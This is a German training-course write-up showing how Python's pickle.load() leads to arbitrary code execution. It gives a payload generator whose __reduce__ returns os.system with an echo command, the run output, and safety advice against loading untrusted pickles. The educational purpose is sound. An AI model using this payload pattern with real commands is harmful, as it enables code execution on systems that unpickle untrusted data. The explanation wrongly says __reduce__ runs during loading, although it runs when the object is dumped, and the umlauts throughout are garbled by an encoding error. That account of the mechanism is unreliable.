# üñ•Ô∏è Quite a Pickle - Pickle Sicherheitsl√ºcke

**Kurs:** Fachinformatiker Ausbildung | **Datum:** 19.01.2026

---

## Aufgabe

**Ziel:** Demonstriere wie `pickle.load()` zu Arbitrary Code Execution f√ºhren kann.

---

## L√∂sung

### Payload-Generator Script (create_payload.py)

```python
import pickle
import os

class MaliciousPayload:
    """Klasse die bei pickle.load() Code ausf√ºhrt."""
    
    def __reduce__(self):
        """
        __reduce__ wird beim Deserialisieren aufgerufen.
        Gibt ein Tuple zur√ºck: (callable, args)
        Das callable wird mit args aufgerufen.
        """
        return (os.system, ('echo "Hacked by a pickle"',))

# Payload erstellen und speichern
payload = MaliciousPayload()

with open("payload.pkl", "wb") as f:
    pickle.dump(payload, f)

print("Malicious payload created: payload.pkl")
```

### Ausf√ºhrung

```bash
$ python create_payload.py
Malicious payload created: payload.pkl

$ python vulnerable_script.py payload.pkl
Hacked by a pickle
```

---

## Erkl√§rung

| Komponente | Funktion |
|------------|----------|
| `__reduce__()` | Spezielle Methode f√ºr Serialisierung |
| `os.system` | F√ºhrt Shell-Befehle aus |
| `pickle.load()` | Ruft `__reduce__()` auf ‚Üí Code-Ausf√ºhrung |

### Ablauf

1. `pickle.dump()` serialisiert das Objekt inkl. `__reduce__`
2. `pickle.load()` deserialisiert und ruft `__reduce__()` auf
3. `__reduce__()` gibt `(os.system, ('echo ...',))` zur√ºck
4. Pickle f√ºhrt `os.system('echo "Hacked by a pickle"')` aus

---

## Notizen

- **‚ö†Ô∏è GEFAHR:** Pickle kann beliebigen Code ausf√ºhren!
- **Regel:** Niemals pickle-Dateien aus unbekannten Quellen laden
- **Alternative:** JSON f√ºr sichere Daten-Serialisierung
- **`__reduce__()`:** Kontrolliert wie ein Objekt serialisiert/deserialisiert wird
- **Angriffsvektoren:** Datei-Upload, Man-in-the-Middle, manipulierte Configs
